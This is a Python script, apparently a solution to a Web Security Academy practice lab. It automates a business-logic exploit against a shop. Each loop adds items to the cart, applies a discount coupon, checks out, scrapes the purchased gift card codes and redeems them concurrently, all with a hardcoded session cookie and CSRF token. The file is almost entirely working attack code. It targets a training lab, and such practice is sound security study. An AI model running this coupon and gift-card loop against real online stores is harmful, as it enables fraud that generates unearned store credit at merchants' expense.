import requests
import re
from concurrent.futures import ThreadPoolExecutor

# Configuration
URL = "https://0af1004f0432c33182cc241800bd000c.web-security-academy.net" 
COOKIE = "session=X9U0snN9XO6GtzYBqhIlWBN1zed7w4CC"
CSRF = "Lkj4CVI81FFY8wxgkbhZmgOAc1VqfWcR"
HEADERS = {
    "Cookie": COOKIE,
    "Content-Type": "application/x-www-form-urlencoded"
}
PRODUCT_ID = 2
QUANTITY = 10
COUPON = "SIGNUP30"

# Reusable session
session = requests.Session()
session.headers.update(HEADERS)

def kupon_ke_keranjang():
    data = {
        "productId": str(PRODUCT_ID),
        "redir": "PRODUCT",
        "quantity": str(QUANTITY)
    }
    res = session.post(f"{URL}/cart", data=data)
    print("Added to cart:", res.status_code)

def pake_kupon():
    data = {
        "csrf": CSRF,
        "coupon": COUPON
    }
    res = session.post(f"{URL}/cart/coupon", data=data)
    print("Coupon applied:", res.text.strip())

def checkout():
    data = {"csrf": CSRF}
    res = session.post(f"{URL}/cart/checkout", data=data)
    print("Checkout complete:", res.status_code)

def list_card():
    res = session.get(f"{URL}/cart/order-confirmation?order-confirmed=true")
    matches = re.findall(r'(?<=<td>)[A-Za-z0-9]{10}(?=</td>)', res.text)
    print(f"Found {len(matches)} gift cards")
    return matches

def apply_gift_card(code):
    data = {
        "csrf": CSRF,
        "gift-card": code
    }
    try:
        res = session.post(f"{URL}/gift-card", data=data)
        print(f"Gift card {code} response: {res.text.strip()}")
    except Exception as e:
        print(f"Error applying gift card {code}: {e}")

def pake_giftcard(codes):
    # Only apply up to 10
    cards_to_apply = codes[:10]
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(apply_gift_card, cards_to_apply)

def main():
    for i in range(1, 31):
        print(f"\n--- Loop {i} ---")
        kupon_ke_keranjang()
        pake_kupon()
        checkout()
        cards = list_card()
        if cards:
            pake_giftcard(cards)

if __name__ == "__main__":
    main()
